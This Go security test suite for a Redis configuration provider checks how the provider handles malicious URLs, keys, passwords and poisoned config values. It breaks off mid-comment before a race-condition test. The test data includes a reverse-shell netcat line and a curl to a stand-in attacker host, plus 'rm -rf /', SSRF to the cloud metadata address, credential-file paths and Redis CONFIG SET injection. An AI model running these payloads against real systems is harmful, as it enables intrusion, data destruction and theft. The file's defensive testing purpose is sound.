// security_test.go: Comprehensive Security Testing Suite for Argus Redis Provider
//
// RED TEAM SECURITY ANALYSIS:
// This file implements systematic security testing against Redis remote configuration provider,
// designed to identify and prevent common attack vectors in production environments.
//
// THREAT MODEL:
// - Malicious Redis URLs (SSRF, injection attacks, credential exposure)
// - Redis command injection and dangerous key patterns
// - Resource exhaustion and DoS through connection abuse
// - Authentication bypass and privilege escalation attacks
// - Configuration injection and data poisoning via Redis values
// - Sensitive data leakage through error messages and logs
// - Race conditions in concurrent access scenarios
// - Provider state manipulation and resource leaks
//
// PHILOSOPHY:
// Each test is designed to be:
// - DRY (Don't Repeat Yourself) with reusable security utilities
// - SMART (Specific, Measurable, Achievable, Relevant, Time-bound)
// - COMPREHENSIVE covering all major attack vectors
// - WELL-DOCUMENTED explaining the security implications
//
// METHODOLOGY:
// 1. Identify attack surface and entry points in Redis provider
// 2. Create targeted exploit scenarios for each vulnerability class
// 3. Test boundary conditions and edge cases specific to Redis
// 4. Validate security controls and mitigations in provider
// 5. Document vulnerabilities and remediation steps
//
// Copyright (c) 2025 AGILira - A. Giordano
// Series: an AGLIra library
// SPDX-License-Identifier: MPL-2.0

package redis

import (
	"context"
	"fmt"
	"net"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/redis/go-redis/v9"
)

// =============================================================================
// SECURITY TESTING UTILITIES AND HELPERS
// =============================================================================

// SecurityTestContext provides utilities for security testing scenarios specific to Redis provider.
// This centralizes common security testing patterns and reduces code duplication.
type SecurityTestContext struct {
	t                    *testing.T
	tempDir              string
	originalEnvVars      map[string]string
	mockRedisServers     []*MockRedisServer
	cleanupFunctions     []func()
	mu                   sync.Mutex
	memoryUsageBefore    uint64
	goroutineCountBefore int
}

// MockRedisServer represents a mock Redis server for testing malicious behaviors
type MockRedisServer struct {
	listener net.Listener
	behavior string
	address  string
}

// NewSecurityTestContext creates a new security testing context with automatic cleanup.
//
// SECURITY BENEFIT: Ensures test isolation and prevents test artifacts from
// affecting system security or other tests. Critical for reliable security testing.
func NewSecurityTestContext(t *testing.T) *SecurityTestContext {
	ctx := &SecurityTestContext{
		t:                    t,
		tempDir:              t.TempDir(),
		originalEnvVars:      make(map[string]string),
		mockRedisServers:     make([]*MockRedisServer, 0),
		cleanupFunctions:     make([]func(), 0),
		goroutineCountBefore: runtime.NumGoroutine(),
	}

	// Capture initial memory usage for resource leak detection
	var memStats runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&memStats)
	ctx.memoryUsageBefore = memStats.Alloc

	// Register cleanup
	t.Cleanup(ctx.Cleanup)

	return ctx
}

// CreateMaliciousRedisServer creates a mock Redis server with malicious responses.
//
// SECURITY PURPOSE: Tests how the provider handles various malicious server behaviors,
// including oversized responses, connection hijacking, and protocol attacks.
func (ctx *SecurityTestContext) CreateMaliciousRedisServer(behavior string) *MockRedisServer {
	ctx.mu.Lock()
	defer ctx.mu.Unlock()

	// Create a listener on a random port
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		ctx.t.Fatalf("Failed to create mock Redis server: %v", err)
	}

	mockServer := &MockRedisServer{
		listener: listener,
		behavior: behavior,
		address:  listener.Addr().String(),
	}

	// Start serving in background
	go mockServer.serve()

	ctx.mockRedisServers = append(ctx.mockRedisServers, mockServer)
	return mockServer
}

// serve handles incoming connections based on the configured behavior
func (m *MockRedisServer) serve() {
	for {
		conn, err := m.listener.Accept()
		if err != nil {
			return // Listener closed
		}

		go m.handleConnection(conn)
	}
}

// handleConnection processes a single connection with malicious behavior
func (m *MockRedisServer) handleConnection(conn net.Conn) {
	defer func() {
		if err := conn.Close(); err != nil {
			// Ignore connection close errors in tests
		}
	}()

	buf := make([]byte, 4096)
	_, err := conn.Read(buf)
	if err != nil {
		return
	}

	switch m.behavior {
	case "oversized_response":
		// Send extremely large response to test memory exhaustion
		largeData := strings.Repeat("A", 10*1024*1024) // 10MB of data
		response := fmt.Sprintf("$%d\r\n%s\r\n", len(largeData), largeData)
		_, _ = conn.Write([]byte(response))

	case "slow_response":
		// Simulate slowloris attack - delay response
		time.Sleep(30 * time.Second)
		_, _ = conn.Write([]byte("+OK\r\n"))

	case "malformed_response":
		// Send malformed Redis protocol
		_, _ = conn.Write([]byte("INVALID_REDIS_PROTOCOL_{{{\r\n"))

	case "connection_hijack":
		// Try to send unauthorized commands
		_, _ = conn.Write([]byte("*2\r\n$7\r\nFLUSHDB\r\n$0\r\n\r\n+OK\r\n"))

	case "auth_bypass":
		// Always respond OK to AUTH regardless of credentials
		_, _ = conn.Write([]byte("+OK\r\n"))

	case "credential_leak":
		// Echo back any AUTH command data
		if strings.Contains(string(buf), "AUTH") {
			response := fmt.Sprintf("$%d\r\n%s\r\n", len(buf), string(buf))
			_, _ = conn.Write([]byte(response))
		} else {
			_, _ = conn.Write([]byte("+OK\r\n"))
		}

	default:
		// Normal behavior for baseline tests
		_, _ = conn.Write([]byte("+OK\r\n"))
	}
}

// Close shuts down the mock Redis server
func (m *MockRedisServer) Close() {
	if m.listener != nil {
		if err := m.listener.Close(); err != nil {
			// Ignore listener close errors in tests
		}
	}
}

// GetRedisURL returns the Redis URL for connecting to this mock server
func (m *MockRedisServer) GetRedisURL() string {
	return fmt.Sprintf("redis://%s/test-key", m.address)
}

// ExpectSecurityError validates that a security-related error occurred.
//
// SECURITY PRINCIPLE: Security tests should expect failures when malicious
// input is provided. If an operation succeeds with malicious input, that
// indicates a potential security vulnerability.
func (ctx *SecurityTestContext) ExpectSecurityError(err error, operation string) {
	if err == nil {
		ctx.t.Errorf("SECURITY VULNERABILITY: %s should have failed with malicious input but succeeded", operation)
	}
}

// ExpectSecuritySuccess validates that a legitimate operation succeeded.
//
// SECURITY PRINCIPLE: Security controls should not break legitimate functionality.
func (ctx *SecurityTestContext) ExpectSecuritySuccess(err error, operation string) {
	if err != nil {
		ctx.t.Errorf("SECURITY ISSUE: %s should have succeeded with legitimate input but failed: %v", operation, err)
	}
}

// CheckResourceLeak detects memory and goroutine leaks after operations.
//
// SECURITY PURPOSE: Resource leaks can be exploited for DoS attacks and
// indicate improper cleanup that could lead to security issues.
func (ctx *SecurityTestContext) CheckResourceLeak(operationName string) {
	runtime.GC()
	time.Sleep(100 * time.Millisecond) // Allow cleanup to complete

	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)
	currentMemory := memStats.Alloc
	currentGoroutines := runtime.NumGoroutine()

	// Check for significant memory increase (handle potential underflow)
	var memoryIncrease uint64
	if currentMemory > ctx.memoryUsageBefore {
		memoryIncrease = currentMemory - ctx.memoryUsageBefore
		if memoryIncrease > 10*1024*1024 { // More than 10MB increase
			ctx.t.Errorf("SECURITY WARNING: %s caused significant memory increase: %d bytes",
				operationName, memoryIncrease)
		}
	}

	// Check for goroutine leaks (be more tolerant for stress tests)
	goroutineIncrease := currentGoroutines - ctx.goroutineCountBefore
	toleranceLimit := 5
	if strings.Contains(operationName, "exhaustion") || strings.Contains(operationName, "concurrent") {
		toleranceLimit = 200 // Higher tolerance for stress tests that create many goroutines
	}

	if goroutineIncrease > toleranceLimit {
		ctx.t.Errorf("SECURITY WARNING: %s caused goroutine leak: %d new goroutines",
			operationName, goroutineIncrease)
	}
}

// Cleanup restores environment and shuts down test servers.
func (ctx *SecurityTestContext) Cleanup() {
	ctx.mu.Lock()
	defer ctx.mu.Unlock()

	// Run custom cleanup functions
	for _, fn := range ctx.cleanupFunctions {
		func() {
			defer func() {
				if r := recover(); r != nil {
					ctx.t.Logf("Warning: Cleanup function panicked: %v", r)
				}
			}()
			fn()
		}()
	}

	// Close mock servers
	for _, server := range ctx.mockRedisServers {
		server.Close()
	}
}

// =============================================================================
// REDIS URL INJECTION AND VALIDATION ATTACKS
// =============================================================================

// TestSecurity_RedisURLInjectionAttacks tests for URL injection vulnerabilities.
//
// ATTACK VECTOR: URL injection and SSRF (CWE-918)
// DESCRIPTION: Attackers attempt to manipulate Redis URLs to access internal
// services, bypass authentication, or perform server-side request forgery.
//
// IMPACT: Could lead to unauthorized access to internal services, credential
// exposure, or information disclosure about internal network topology.
func TestSecurity_RedisURLInjectionAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	maliciousURLs := []struct {
		name        string
		url         string
		description string
		expectError bool
	}{
		{
			name:        "SSRFInternalServices",
			url:         "redis://127.0.0.1:22/config", // SSH port
			description: "Attempt to connect to internal SSH service via SSRF",
			expectError: false, // URL parsing should succeed, connection should fail safely
		},
		{
			name:        "SSRFMetadataService",
			url:         "redis://169.254.169.254:80/latest/meta-data", // AWS metadata
			description: "Attempt to access cloud metadata service",
			expectError: false, // URL parsing should succeed
		},
		{
			name:        "SSRFLocalhostBypass",
			url:         "redis://localhost:3306/config", // MySQL port
			description: "Attempt to access local database via localhost",
			expectError: false,
		},
		{
			name:        "CredentialInjectionInURL",
			url:         "redis://admin:secret123@redis.evil.com:6379/config",
			description: "Embedded credentials that could be logged or leaked",
			expectError: false, // Should parse but credentials should be handled securely
		},
		{
			name:        "FragmentInjection",
			url:         "redis://redis.example.com:6379/config#../../../etc/passwd",
			description: "Fragment injection attempt for path traversal",
			expectError: false, // Fragments should be ignored in Redis URLs
		},
		{
			name:        "SchemeConfusion",
			url:         "http://redis.example.com:6379/config", // Wrong scheme
			description: "Wrong scheme should be rejected by provider",
			expectError: true,
		},
		{
			name:        "QueryParameterInjection",
			url:         "redis://redis.example.com:6379/config?password=secret&debug=true&admin=1",
			description: "Query parameter injection with sensitive data",
			expectError: false, // Should parse but handle parameters securely
		},
		{
			name:        "PortScanningAttempt",
			url:         "redis://internal.company.com:65535/config",
			description: "High port number for internal port scanning",
			expectError: false,
		},
		{
			name:        "IPv6LocalhostBypass",
			url:         "redis://[::1]:6379/config",
			description: "IPv6 localhost bypass attempt",
			expectError: false,
		},
		{
			name:        "OverlongHostname",
			url:         "redis://" + strings.Repeat("a", 1000) + ".com:6379/config",
			description: "Overlong hostname to test buffer handling",
			expectError: false, // Should parse but may fail connection validation
		},
	}

	for _, attack := range maliciousURLs {
		t.Run(attack.name, func(t *testing.T) {
			// SECURITY TEST: URL validation during provider creation
			provider, err := NewProvider("redis://localhost:6379/test") // Valid URL for provider creation
			if err != nil {
				t.Fatalf("Failed to create provider: %v", err)
			}
			defer func() {
				if err := provider.Close(); err != nil {
					t.Logf("Provider close error (ignored in test): %v", err)
				}
			}()

			// SECURITY TEST: Test validation of malicious URL
			err = provider.Validate(attack.url)

			if attack.expectError {
				ctx.ExpectSecurityError(err, fmt.Sprintf("validating malicious URL: %s", attack.description))
			} else {
				// URL should parse successfully
				if err != nil {
					t.Logf("URL parsing failed (may be expected): %v", err)
				}

				// SECURITY TEST: Ensure no actual connection is made during validation
				// Validation should be purely syntactic
				startTime := time.Now()
				_ = provider.Validate(attack.url)
				duration := time.Since(startTime)

				if duration > 100*time.Millisecond {
					t.Errorf("SECURITY WARNING: URL validation took too long (%v), may be making network requests", duration)
				}

				// SECURITY TEST: Attempt to load config and ensure it fails safely for malicious URLs
				ctxTimeout, cancel := context.WithTimeout(context.Background(), 2*time.Second)
				defer cancel()

				_, loadErr := provider.Load(ctxTimeout, attack.url)
				if loadErr == nil {
					t.Errorf("SECURITY CONCERN: Load succeeded for potentially malicious URL: %s", attack.url)
				}
			}
		})
	}
}

// TestSecurity_RedisKeyInjectionAttacks tests for Redis key injection vulnerabilities.
//
// ATTACK VECTOR: Redis command injection through key names (CWE-77)
// DESCRIPTION: Attackers attempt to inject Redis commands or access unauthorized
// keys through manipulation of the key portion of Redis URLs.
func TestSecurity_RedisKeyInjectionAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	maliciousKeys := []struct {
		name        string
		redisURL    string
		description string
		expectBlock bool
	}{
		{
			name:        "BasicPathTraversal",
			redisURL:    "redis://localhost:6379/../../../secret/config",
			description: "Basic path traversal in Redis key",
			expectBlock: true,
		},
		{
			name:        "WindowsPathTraversal",
			redisURL:    "redis://localhost:6379/..\\..\\secret\\config",
			description: "Windows-style path traversal in key",
			expectBlock: true,
		},
		{
			name:        "URLEncodedTraversal",
			redisURL:    "redis://localhost:6379/%2e%2e%2fsecret%2fconfig",
			description: "URL-encoded path traversal in key",
			expectBlock: true,
		},
		{
			name:        "DoubleEncodedTraversal",
			redisURL:    "redis://localhost:6379/%252e%252e%252fsecret%252fconfig",
			description: "Double URL-encoded path traversal",
			expectBlock: true,
		},
		{
			name:        "RedisCommandInjection",
			redisURL:    "redis://localhost:6379/FLUSHDB",
			description: "Dangerous Redis command as key",
			expectBlock: true,
		},
		{
			name:        "RedisEvalInjection",
			redisURL:    "redis://localhost:6379/EVAL",
			description: "Redis EVAL command injection",
			expectBlock: true,
		},
		{
			name:        "RedisScriptInjection",
			redisURL:    "redis://localhost:6379/SCRIPT",
			description: "Redis SCRIPT command injection",
			expectBlock: true,
		},
		{
			name:        "RedisConfigInjection",
			redisURL:    "redis://localhost:6379/CONFIG",
			description: "Redis CONFIG command injection",
			expectBlock: true,
		},
		{
			name:        "RedisDebugInjection",
			redisURL:    "redis://localhost:6379/DEBUG",
			description: "Redis DEBUG command injection",
			expectBlock: true,
		},
		{
			name:        "DangerousUnderscorePattern",
			redisURL:    "redis://localhost:6379/config__set",
			description: "Double underscore pattern (often used in exploits)",
			expectBlock: true,
		},
		{
			name:        "NullByteInjection",
			redisURL:    "redis://localhost:6379/config\x00FLUSHDB",
			description: "Null byte injection in key",
			expectBlock: true,
		},
		{
			name:        "NewlineInjection",
			redisURL:    "redis://localhost:6379/config\nFLUSHDB\r\n",
			description: "Newline injection for protocol confusion",
			expectBlock: true,
		},
		{
			name:        "OverlongKey",
			redisURL:    "redis://localhost:6379/" + strings.Repeat("a", 1024*1024),
			description: "Excessively long key for buffer overflow",
			expectBlock: true,
		},
		{
			name:        "ControlCharacterInjection",
			redisURL:    "redis://localhost:6379/config\x01\x02\x03",
			description: "Control characters in key",
			expectBlock: true,
		},
		{
			name:        "WildcardInjection",
			redisURL:    "redis://localhost:6379/*",
			description: "Wildcard pattern injection",
			expectBlock: false, // Wildcards might be legitimate in some contexts
		},
	}

	for _, attack := range maliciousKeys {
		t.Run(attack.name, func(t *testing.T) {
			// Create provider with valid URL first
			provider, err := NewProvider("redis://localhost:6379/test")
			if err != nil {
				t.Fatalf("Failed to create provider: %v", err)
			}
			defer func() {
				if err := provider.Close(); err != nil {
					t.Logf("Provider close error (ignored in test): %v", err)
				}
			}()

			// SECURITY TEST: Key validation during Load operation
			ctxTimeout, cancel := context.WithTimeout(context.Background(), 2*time.Second)
			defer cancel()

			_, err = provider.Load(ctxTimeout, attack.redisURL)

			if attack.expectBlock {
				ctx.ExpectSecurityError(err, fmt.Sprintf("dangerous key pattern should be blocked: %s", attack.description))

				// Verify the error is a security error, not a connection error
				if err != nil && strings.Contains(err.Error(), "SECURITY_VIOLATION") {
					t.Logf("SECURITY GOOD: Dangerous pattern correctly blocked with security error: %v", err)
				} else if err != nil {
					t.Logf("Key blocked (reason unclear): %v", err)
				}
			} else {
				// Even if not blocked, should fail gracefully without executing dangerous operations
				if err != nil {
					t.Logf("Key validation failed (potentially acceptable): %v", err)
				}
			}
		})
	}
}

// =============================================================================
// AUTHENTICATION AND AUTHORIZATION ATTACKS
// =============================================================================

// TestSecurity_AuthenticationBypassAttacks tests for authentication bypass vulnerabilities.
//
// ATTACK VECTOR: Authentication bypass (CWE-287)
// DESCRIPTION: Attackers attempt to bypass Redis AUTH through various techniques
// including password injection, timing attacks, and credential manipulation.
func TestSecurity_AuthenticationBypassAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	// Create mock server that requires authentication
	authServer := ctx.CreateMaliciousRedisServer("auth_bypass")
	defer authServer.Close()

	authBypassAttempts := []struct {
		name        string
		redisURL    string
		description string
	}{
		{
			name:        "EmptyPasswordBypass",
			redisURL:    fmt.Sprintf("redis://:%s", authServer.GetRedisURL()[8:]), // Remove redis:// and add empty password
			description: "Attempt bypass with empty password",
		},
		{
			name:        "SQLInjectionInPassword",
			redisURL:    fmt.Sprintf("redis://user:' OR '1'='1@%s", authServer.address+"/config"),
			description: "SQL injection attempt in Redis password",
		},
		{
			name:        "PasswordWithNullBytes",
			redisURL:    fmt.Sprintf("redis://user:secret\x00admin@%s/config", authServer.address),
			description: "Null byte injection in password",
		},
		{
			name:        "OverlongPassword",
			redisURL:    fmt.Sprintf("redis://user:%s@%s/config", strings.Repeat("a", 10000), authServer.address),
			description: "Overlong password to test buffer handling",
		},
		{
			name:        "PasswordWithControlChars",
			redisURL:    fmt.Sprintf("redis://user:secret%%01%%02%%03@%s/config", authServer.address),
			description: "Control characters in password",
		},
		{
			name:        "CommandInjectionInPassword",
			redisURL:    fmt.Sprintf("redis://user:pass\r\nFLUSHDB\r\n@%s/config", authServer.address),
			description: "Redis command injection via password field",
		},
	}

	for _, attack := range authBypassAttempts {
		t.Run(attack.name, func(t *testing.T) {
			// Create provider with valid URL first
			provider, err := NewProvider("redis://localhost:6379/test")
			if err != nil {
				t.Fatalf("Failed to create provider: %v", err)
			}
			defer func() {
				if err := provider.Close(); err != nil {
					t.Logf("Provider close error (ignored in test): %v", err)
				}
			}()

			// SECURITY TEST: Authentication should not be bypassed
			ctxTimeout, cancel := context.WithTimeout(context.Background(), 3*time.Second)
			defer cancel()

			startTime := time.Now()
			_, err = provider.Load(ctxTimeout, attack.redisURL)
			duration := time.Since(startTime)

			// Should fail for authentication/security reasons
			ctx.ExpectSecurityError(err, fmt.Sprintf("authentication bypass attempt: %s", attack.description))

			// SECURITY ANALYSIS: Check for timing attack vulnerabilities
			if duration < 10*time.Millisecond {
				t.Logf("Fast failure (good): %v - may indicate proper input validation", duration)
			} else if duration > 5*time.Second {
				t.Errorf("SECURITY WARNING: Slow authentication failure (%v) may indicate timing attack vulnerability", duration)
			}
		})
	}
}

// TestSecurity_CredentialLeakageAttacks tests for credential exposure vulnerabilities.
//
// ATTACK VECTOR: Information disclosure (CWE-200)
// DESCRIPTION: Attackers attempt to extract credentials through error messages,
// logs, or other information leakage channels.
func TestSecurity_CredentialLeakageAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	// Create server that echoes back credentials
	leakServer := ctx.CreateMaliciousRedisServer("credential_leak")
	defer leakServer.Close()

	credentialTests := []struct {
		name        string
		redisURL    string
		description string
	}{
		{
			name:        "PasswordInURL",
			redisURL:    fmt.Sprintf("redis://user:topsecret123@%s/config", leakServer.address),
			description: "Password embedded in URL",
		},
		{
			name:        "PasswordInQueryParam",
			redisURL:    fmt.Sprintf("redis://%s/config?password=secret-redis-password-123", leakServer.address),
			description: "Password in URL parameters",
		},
		{
			name:        "MultipleCredentials",
			redisURL:    fmt.Sprintf("redis://admin:password@%s/config?auth=token123", leakServer.address),
			description: "Multiple credential types",
		},
	}

	for _, test := range credentialTests {
		t.Run(test.name, func(t *testing.T) {
			// Create provider with valid URL first
			provider, err := NewProvider("redis://localhost:6379/test")
			if err != nil {
				t.Fatalf("Failed to create provider: %v", err)
			}
			defer func() {
				if err := provider.Close(); err != nil {
					t.Logf("Provider close error (ignored in test): %v", err)
				}
			}()

			// SECURITY TEST: Ensure validation doesn't leak credentials
			err = provider.Validate(test.redisURL)
			if err != nil {
				// Check if error message contains credentials
				errorMsg := err.Error()
				if strings.Contains(errorMsg, "topsecret123") ||
					strings.Contains(errorMsg, "secret-redis-password-123") ||
					strings.Contains(errorMsg, "password") {
					t.Errorf("SECURITY VULNERABILITY: Credential leaked in validation error: %s", errorMsg)
				}
			}

			// SECURITY TEST: Ensure Load operations don't leak credentials in errors
			ctxTimeout, cancel := context.WithTimeout(context.Background(), 2*time.Second)
			defer cancel()

			_, err = provider.Load(ctxTimeout, test.redisURL)
			if err != nil {
				errorMsg := err.Error()
				// Check for credential leakage in error messages
				sensitiveData := []string{
					"topsecret123", "secret-redis-password-123", "password",
					"admin", "token123", "secret",
				}

				for _, sensitive := range sensitiveData {
					if strings.Contains(errorMsg, sensitive) {
						t.Errorf("SECURITY VULNERABILITY: Sensitive data '%s' leaked in Load error: %s",
							sensitive, errorMsg)
					}
				}
			}

			// SECURITY TEST: String representation should not expose credentials
			providerStr := fmt.Sprintf("%+v", provider)
			if strings.Contains(providerStr, "topsecret123") ||
				strings.Contains(providerStr, "secret-redis-password-123") {
				t.Errorf("SECURITY VULNERABILITY: Credentials exposed in provider string representation")
			}
		})
	}
}

// =============================================================================
// RESOURCE EXHAUSTION AND DENIAL OF SERVICE ATTACKS
// =============================================================================

// TestSecurity_ResourceExhaustionAttacks tests for DoS via resource exhaustion.
//
// ATTACK VECTOR: Resource exhaustion (CWE-400)
// DESCRIPTION: Attackers attempt to consume excessive resources through
// large responses, connection exhaustion, or memory exhaustion attacks.
func TestSecurity_ResourceExhaustionAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	t.Run("LargeResponseAttack", func(t *testing.T) {
		// Create server that sends oversized responses
		maliciousServer := ctx.CreateMaliciousRedisServer("oversized_response")
		defer maliciousServer.Close()

		redisURL := maliciousServer.GetRedisURL()
		// Create provider with valid URL first
		provider, err := NewProvider("redis://localhost:6379/test")
		if err != nil {
			t.Fatalf("Failed to create provider: %v", err)
		}
		defer func() {
			if err := provider.Close(); err != nil {
				t.Logf("Provider close error (ignored in test): %v", err)
			}
		}()

		// SECURITY TEST: Load operation should handle large responses safely
		ctxTimeout, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()

		startMemory := getCurrentMemoryUsage()
		_, err = provider.Load(ctxTimeout, redisURL)
		endMemory := getCurrentMemoryUsage()

		// Should either fail gracefully or handle the large response within reasonable memory limits
		if endMemory > startMemory {
			memoryIncrease := endMemory - startMemory
			if memoryIncrease > 50*1024*1024 { // More than 50MB
				t.Errorf("SECURITY VULNERABILITY: Large response attack caused excessive memory usage: %d bytes",
					memoryIncrease)
			}
		}

		if err == nil {
			t.Logf("Large response was handled (check memory usage)")
		} else {
			t.Logf("Large response was rejected (good): %v", err)
		}

		ctx.CheckResourceLeak("large response attack")
	})

	t.Run("SlowlorisAttack", func(t *testing.T) {
		// Create server with slow responses (slowloris-style attack)
		slowServer := ctx.CreateMaliciousRedisServer("slow_response")
		defer slowServer.Close()

		redisURL := slowServer.GetRedisURL()
		// Create provider with valid URL first
		provider, err := NewProvider("redis://localhost:6379/test")
		if err != nil {
			t.Fatalf("Failed to create provider: %v", err)
		}
		defer func() {
			if err := provider.Close(); err != nil {
				t.Logf("Provider close error (ignored in test): %v", err)
			}
		}()

		// SECURITY TEST: Should timeout and not hang indefinitely
		ctxTimeout, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()

		startTime := time.Now()
		_, err = provider.Load(ctxTimeout, redisURL)
		duration := time.Since(startTime)

		// Should timeout within reasonable time
		ctx.ExpectSecurityError(err, "slow response attack (should timeout)")

		if duration > 10*time.Second {
			t.Errorf("SECURITY VULNERABILITY: Slow response attack caused excessive wait time: %v", duration)
		}

		ctx.CheckResourceLeak("slowloris attack")
	})

	t.Run("ConnectionExhaustionAttack", func(t *testing.T) {
		// Test concurrent connection handling
		// Create provider with valid URL first
		provider, err := NewProvider("redis://localhost:6379/test")
		if err != nil {
			t.Fatalf("Failed to create provider: %v", err)
		}
		defer func() {
			if err := provider.Close(); err != nil {
				t.Logf("Provider close error (ignored in test): %v", err)
			}
		}()

		// SECURITY TEST: Create many concurrent connections
		var wg sync.WaitGroup
		concurrentRequests := 20 // Reduced to avoid overwhelming test environment
		errors := make([]error, concurrentRequests)

		for i := 0; i < concurrentRequests; i++ {
			wg.Add(1)
			go func(index int) {
				defer wg.Done()

				ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
				defer cancel()

				// Use a non-existent Redis server to trigger connection errors
				_, err := provider.Load(ctx, "redis://127.0.0.1:16379/test-key") // Non-standard port
				errors[index] = err
			}(i)
		}

		wg.Wait()

		// SECURITY ANALYSIS: All connections should fail gracefully (no Redis server running)
		failCount := 0
		for _, err := range errors {
			if err != nil {
				failCount++
			}
		}

		if failCount == concurrentRequests {
			t.Logf("All concurrent requests failed gracefully (expected with no Redis server)")
		} else {
			t.Logf("Concurrent requests: %d/%d failed", failCount, concurrentRequests)
		}

		ctx.CheckResourceLeak("connection exhaustion attack")
	})
}

// =============================================================================
// CONFIGURATION INJECTION AND DATA POISONING ATTACKS
// =============================================================================

// TestSecurity_ConfigurationPoisoningAttacks tests for data poisoning vulnerabilities.
//
// ATTACK VECTOR: Data injection (CWE-74)
// DESCRIPTION: Attackers attempt to inject malicious configuration data
// through Redis values that could compromise the application using the configuration.
func TestSecurity_ConfigurationPoisoningAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	maliciousConfigs := []struct {
		name        string
		configData  string
		description string
	}{
		{
			name: "JavaScriptInjection",
			configData: `{
				"command": "<script>alert('xss')</script>",
				"url": "javascript:alert(1)"
			}`,
			description: "JavaScript injection in configuration values",
		},
		{
			name: "SQLInjectionPayload",
			configData: `{
				"query": "'; DROP TABLE users; --",
				"filter": "1' OR '1'='1"
			}`,
			description: "SQL injection payloads in configuration",
		},
		{
			name: "CommandInjectionPayload",
			configData: `{
				"command": "ls; rm -rf /",
				"path": "/bin/sh -c 'curl http://evil.com'",
				"arg": "; nc -e /bin/bash attacker.com 443"
			}`,
			description: "Command injection payloads",
		},
		{
			name: "PathTraversalPayload",
			configData: `{
				"file": "../../../etc/passwd",
				"include": "..\\..\\windows\\system32\\config\\sam",
				"template": "/proc/self/environ"
			}`,
			description: "Path traversal in configuration paths",
		},
		{
			name: "RedisCommandInjection",
			configData: `{
				"redis_cmd": "FLUSHDB",
				"eval_script": "redis.call('FLUSHALL')",
				"lua_code": "return redis.call('CONFIG', 'SET', 'dir', '/tmp')"
			}`,
			description: "Redis command injection through configuration",
		},
		{
			name: "OverlongValues",
			configData: fmt.Sprintf(`{
				"large_field": "%s",
				"buffer_overflow": "%s"
			}`,
				strings.Repeat("A", 1024*1024), // 1MB string
				strings.Repeat("B", 100*1024)), // 100KB string
			description: "Overlong values for buffer overflow attacks",
		},
		{
			name:        "DeeplyNestedConfig",
			configData:  strings.Repeat(`{"nested":`, 1000) + `"value"` + strings.Repeat(`}`, 1000),
			description: "Deeply nested JSON for parser DoS",
		},
		{
			name: "NullByteInjection",
			configData: `{
				"file": "config.json\u0000.exe",
				"path": "/etc/passwd\x00.txt"
			}`,
			description: "Null byte injection in strings",
		},
	}

	for _, attack := range maliciousConfigs {
		t.Run(attack.name, func(t *testing.T) {
			// Create a temporary Redis client for testing
			// Note: This test assumes a local Redis instance is available
			// In production tests, you might want to use a containerized Redis
			client := redis.NewClient(&redis.Options{
				Addr: "localhost:6379",
				DB:   15, // Use a test database
			})
			defer func() {
				if err := client.Close(); err != nil {
					t.Logf("Redis client close error (ignored in test): %v", err)
				}
			}()

			// Check if Redis is available
			ctx_ping, cancel := context.WithTimeout(context.Background(), 1*time.Second)
			defer cancel()

			if err := client.Ping(ctx_ping).Err(); err != nil {
				t.Skip("Redis not available for testing")
				return
			}

			// Set the malicious configuration data
			testKey := fmt.Sprintf("security_test_%s", attack.name)
			err := client.Set(ctx_ping, testKey, attack.configData, time.Minute).Err()
			if err != nil {
				t.Fatalf("Failed to set test data: %v", err)
			}

			// Cleanup after test
			defer client.Del(context.Background(), testKey)

			// Create provider with valid URL first
			provider, providerErr := NewProvider("redis://localhost:6379/test")
			if providerErr != nil {
				t.Fatalf("Failed to create provider: %v", providerErr)
			}
			defer func() {
				if err := provider.Close(); err != nil {
					t.Logf("Provider close error (ignored in test): %v", err)
				}
			}()

			redisURL := fmt.Sprintf("redis://localhost:6379/%s", testKey)

			// SECURITY TEST: Load malicious configuration
			ctxTimeout, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			startMemory := getCurrentMemoryUsage()
			startTime := time.Now()

			config, err := provider.Load(ctxTimeout, redisURL)

			endTime := time.Now()
			endMemory := getCurrentMemoryUsage()
			duration := endTime.Sub(startTime)

			if err != nil {
				// Configuration was rejected - check error doesn't leak sensitive data
				t.Logf("Malicious config rejected (potentially good): %v", err)

				// Ensure error doesn't contain the malicious payload
				errorMsg := err.Error()
				if len(attack.configData) > 50 && strings.Contains(errorMsg, attack.configData[:50]) {
					t.Errorf("SECURITY WARNING: Error message contains malicious payload")
				}
			} else {
				// Configuration was loaded - perform security analysis
				t.Logf("Malicious config loaded - analyzing security impact")

				// Check for excessive memory usage
				var memoryIncrease uint64
				if endMemory > startMemory {
					memoryIncrease = endMemory - startMemory
				}

				if memoryIncrease > 20*1024*1024 { // More than 20MB
					t.Errorf("SECURITY VULNERABILITY: Malicious config caused excessive memory usage: %d bytes",
						memoryIncrease)
				}

				// Check for excessive processing time
				if duration > 3*time.Second {
					t.Errorf("SECURITY VULNERABILITY: Malicious config caused excessive processing time: %v",
						duration)
				}

				// Verify configuration structure is reasonable
				if config != nil {
					configStr := fmt.Sprintf("%+v", config)
					if len(configStr) > 50*1024 { // More than 50KB when printed
						t.Errorf("SECURITY WARNING: Loaded configuration is excessively large")
					}

					// Check for successful injection indicators
					if strings.Contains(configStr, "<script>") ||
						strings.Contains(configStr, "DROP TABLE") ||
						strings.Contains(configStr, "rm -rf") ||
						strings.Contains(configStr, "FLUSHDB") {
						t.Logf("SECURITY NOTICE: Malicious patterns found in loaded config - ensure they are safely handled by application")
					}
				}
			}

			ctx.CheckResourceLeak(fmt.Sprintf("malicious config: %s", attack.name))
		})
	}
}

// =============================================================================
// RACE CONDITION AND CONCURRENCY ATTACKS
// =============================================================================

// TestSecurity_RaceConditionAttacks tests for race condition vulnerabilities.
//
// ATTACK VECTOR: Race conditions (CWE-362)
// DESCRIPTION: Attackers attempt to exploit race conditions in concurrent
